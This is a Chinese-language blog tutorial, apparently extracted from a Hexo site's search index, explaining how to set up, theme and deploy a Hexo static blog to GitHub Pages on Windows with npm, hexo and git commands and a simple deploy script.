    <url>%2F2019%2F04%2F25%2F%E4%BD%BF%E7%94%A8github-hexo%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[使用github+hexo创建一个博客github建库过程略 在Windows系统下，要使用hexo需要先安装Nodejs以及Git 1.安装NodejsNodejs下载地址，下载之后，一路默认安装 2.安装GitGit下载地址，下载之后又是一路安装 3.安装Hexo3.1创建一个文件夹创建一个文件夹，比如hexo。来存放数据(这个blog不用管，是后面初始化后自动创建的) 在这个目录下右键，选择红框所示内容。之后会弹出一个框，里面使用的是bash命令。 3.2安装过程在界面中输入下面内容，关于指令含义参考：Hexo-指令 1234567$ cd d:/hexo$ npm install hexo-cli -g $ hexo init blog #初始化一个文件夹，命名为blog$ cd blog$ npm install$ hexo g # 或者hexo generate$ hexo s # 或者hexo server，可以在http://localhost:4000/ 查看 经常使用的命令： hexo generate (hexo g) 生成静态文件，会在当前目录下生成一个新的叫做public的文件夹 hexo server (hexo s) 启动本地web服务，用于博客的预览 hexo deploy (hexo d) 部署播客到远端（比如github, heroku等平台） hexo new “postName” 新建文章，postname指创建的文件名，文件会放在source\ _posts\下 hexo new page “pageName” 新建页面，pagename指创建的网页文件夹名，文件夹放在source\下 3.3更换主题123$ hexo clean #清除缓存文件 (db.json) 和已生成的静态文件 (public)。 #在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需 #要运行该命令$ git clone https://github.com/zhwangart/hexo-theme-ocean.git themes/ocean 3.3.1使用主题修改Hexo目录下的_config.yml配置文件中的theme属性，将其设置为ocean。 3.3.2更新主题12345$ cd themes/ocean$ git pull$ cd ..$ hexo g # 生成$ hexo s # 启动本地web服务器 4.使用hexo deploy部署部署命令说明 4.1扩展安装1npm install hexo-deployer-git --save 4.2修改配置 1234deploy: type:git repo:https://github.com/dilidonglong/dilidonglong.github.io.git branch:master 4.3完成部署然后在命令行中执行 1$ hexo d #部署之前预先生成静态文件 即可完成部署。 4.4其他注意事项上述命令虽然简单方便，但是偶尔会有莫名其妙的问题出现，因此，我们也可以追本溯源，使用git命令来完成部署的工作。 12$ cd d:/hexo/blog$ git clone https://github.com/dilidonglong/dilidonglong.github.io.git .deploy/dilidonglong.github.io 将我们之前创建的仓库克隆到本地，新建一个目录叫做.deploy用于存放克隆的代码。前提是这个库里面有你之前上传上去的内容。 接下来创建一个deploy脚本文件，比如可以取名叫deploy.sh 1234567hexo generatecp -R public/* .deploy/dilidonglong.github.iocd .deploy/dilidonglong.github.iogit add .git commit -m “update”git pull --rebase origin mastergit push origin master 简单解释一下，hexo generate（hexo g）生成public文件夹下的新内容，然后将其拷贝至dilidonglong.github.io的git目录下，然后使用git commit命令提交代码到dilidonglong.github.io这个repo的master branch上。 需要部署的时候，执行这段脚本就可以了（比如可以将其保存为deploy.sh）。执行过程中可能需要让你输入Github账户的用户名及密码，按照提示操作即可。执行时，等同linux命令行：./deploy.sh 12git pull --rebase origin master对于这条命令，是为了解决git push错误failed to push some refs to的问题 上述问题的参考链接 参考文章： 手把手教你使用Hexo + Github Pages搭建个人独立博客 一个看板娘入住你的个人博客只需要三步 hexo博客美化添加live2d]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
</search>
